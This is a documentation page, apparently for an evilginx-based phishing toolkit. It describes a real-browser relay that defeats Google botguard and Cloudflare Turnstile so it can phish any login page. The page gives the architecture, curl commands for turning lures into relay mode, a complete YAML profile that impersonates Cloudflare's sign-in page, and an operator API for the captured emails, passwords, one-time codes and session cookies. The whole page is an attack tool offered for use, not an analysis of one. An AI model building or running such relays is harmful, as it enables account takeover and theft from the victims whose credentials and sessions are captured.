---
layout: default
title: Real-browser relay (any target)
description: The bgrelay sidecar defeats origin-bound botguard (Google) and domain-locked Turnstile (Cloudflare) for ANY phishlet via declarative profiles.
---

# Real-browser relay — any target

Classic MITM cannot pass defenses that bind attestation to the real origin:
Google's botguard (origin-bound) and Cloudflare's login Turnstile
(domain-locked sitekey). The relay solves both the same way — a **real
Chromium (patchright, headful under Xvfb, residential exit)** drives the
genuine login on the real domain, and the victim interacts with a live
mirror of it served at your lure path.

**Since v0.13.0 the relay is target-agnostic**: everything a target needs
lives in a declarative profile (`tools/relay/profiles/<phishlet>.yaml`) and
**switching a phishlet to relay mode is one lure flag** — no code changes.

## Architecture

```
Victim ──► evilginx :443 lure (relay: true) ──► relay page (branded per profile)
              │                                       │ poll 1.2s JSON
              └─ /__relay/api/* ──────────────► bgrelay :9445
                                                    ├─ profile engine (profiles/*.yaml)
                                                    ├─ patchright Chromium headful (Xvfb :99)
                                                    └─ HTTP→SOCKS bridge :8119 ──► residential exit
                                                         └─► REAL login page (Turnstile/botguard pass)
capture: email + password + cookies ──► store JSON ──► mTLS POST /sessions/import
```

## Switching a target to relay

```bash
# existing lure — flip the switch (hot, no restart):
curl -X PUT .../lures/17 -d '{"relay": true}'
#   (terminal: lures edit 17 relay=true; API POST /lures accepts relay too)

# new relay lure:
curl -X POST .../lures -d '{"phishlet":"cloudflare","relay":true,"token":"auto"}'
```

The Go proxy serves the relay page at the lure path and injects the phishlet
name as `window.__RELAY_TARGET__`; the sidecar picks
`profiles/<phishlet>.yaml`.

## Profile schema (`profiles/<phishlet>.yaml`)

```yaml
phishlet: cloudflare          # session-import target name
flow: generic                 # generic | google (google = dedicated state machine)
signin_url: "https://dash.cloudflare.com/login"   # {hl} placeholder supported
mirror: full                   # card (crop, Google-style) | full (whole viewport)
done_hosts: ["dash.cloudflare.com"]               # done only when NO input visible
cookie_domains: ["cloudflare.com"]                # capture filter
asset_hosts: ["cloudflare.com"]                   # CSS/asset mirror whitelist
reopen_url: "https://dash.cloudflare.com/"        # victim done-redirect + replay
card_selectors: ["form", "main"]                  # mirror card fallbacks
inputs:                        # comma-separated selector lists allowed
  password: "input[type='password'], input#password"
  email:    "input[type='email'], input#email"
  code:     "input[name='otp'], input[inputmode='numeric']"
buttons:
  next: ["button[type='submit']", "button:has-text('Sign in')"]
classify:                      # en/vi strings for state detection
  reload: ["problem with verification"]   # auto-reload the real page (max 2)
  challenge: ["verification code", "mã xác minh"]
  bad_account: ["user not found"]
  wrong_password: ["incorrect email or password"]
  botguard: ["not be secure"]
page:                          # victim-page branding (template fills these)
  title: "Cloudflare Dashboard | Manage Your Account"
  favicon: "data:image/svg+xml;base64,..."
  button_label: "Sign in"
  accent: "#f6821f"  text: "#36393a"  muted: "#5f6875"  line: "#d5d9dd"
  card_radius: 8
  footer_left: "Cloudflare"   footer_right: "Terms   Privacy"
```

`mirror: full` streams the entire viewport (2-column layouts look 1:1 with
the origin); the default card crop keeps the Google-style centered-card look.

Adding a target = writing this one file. `flow: generic` walks visible inputs
in order (email → password → code) — single-card forms (email + password on
one page, submitted once) and step wizards both work; cookies are captured
per `cookie_domains` and imported under the profile's phishlet name.

The **google** profile ships with `flow: google`, which keeps the dedicated
state machine (identifier → password → TOTP / number-match prompt → mailbox)
bit-for-bit.

## Operation

- Env (systemd unit): `RELAY_SOCKS` (comma-separated exit pool),
  `RELAY_PORT` (9445), `RELAY_BRIDGE_PORT` (8119), `RELAY_OP_KEY`, `RELAY_STORE`.
- Operator API (X-Op-Key): `GET /api/sessions`, `GET /api/pool` (exit health),
  `GET /api/capture?id=` (full capture JSON).
- Captures land in `sessions` automatically (mTLS import) — open them with
  egconsole `open <id>` / MCP `open_session` (uses the profile's reopen_url).
- Self-test doctrine: render-only against the relay page; repeated fake
  submissions can cool down the residential exit at the real origin.

## Known limits

- The mirror is a cropped screenshot + input overlay + click relay: every
  visible control works (taps are replayed), but drag/scroll inside the card
  are not mirrored — the flow engine handles the canonical path.
- One victim browser per relay session (8-min deadline, 15-min reap).
- Relay captures import with `landing_url = relay-capture`.

## Related

- [Phishlet authoring](phishlet-authoring) — when to pick relay vs MITM
- [Proxy](proxy) — the residential exit pool both MITM and relay share
